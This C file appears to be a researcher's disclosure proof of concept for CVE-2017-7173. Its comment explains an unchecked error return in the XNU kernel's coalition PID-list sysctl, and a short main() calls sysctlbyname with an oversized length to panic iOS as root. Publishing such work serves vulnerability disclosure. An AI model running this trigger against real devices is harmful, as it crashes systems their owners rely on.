/*
 * sysctl_coalition_get_pid_list-dos.c
 * Brandon Azad
 *
 * CVE-2017-7173
 *
 * The sysctl_coalition_get_pid_list function in bsd/kern/sys_coalition.c uses the
 * coalition_get_pid_list function to collect a list of PIDs in a coalition. This function will
 * return the number of PIDs if successful or a negative errno on failure. However, the
 * sysctl_coalition_get_pid_list function does not properly check for the error condition, meaning
 * it will try to send a negative number of PIDs to userspace via SYSCTL_OUT. Since the length
 * parameter is a size_t, the result is a call to copyout with a very large value.
 *
 * I at first thought that this would be a kernel information leak, since the kernel would try to
 * copy from the stack into a userspace buffer but eventually reach an unmapped page and abort the
 * copy. However, SYSCTL_OUT does not copy out partial values, and on macOS copyio aborts early if
 * the address plus size wraps around. This makes this bug not exploitable on macOS.
 *
 * However, on iOS (or at least on iOS 10.1.1) the copyio function triggers a panic if the address
 * plus size wraps around. This means that this bug can be used for denial-of-service.
 *
 * Exploitation requires root privileges.
 */

#include <unistd.h>
#include <sys/sysctl.h>

int
main() {
	char old[0x1000];
	size_t oldlen = 0xffffffffffffffff;
	int new[3] = { 0, 6, getpid() };
	sysctlbyname("kern.coalition_pid_list", old, &oldlen, new, sizeof(new));
	return 0;
}
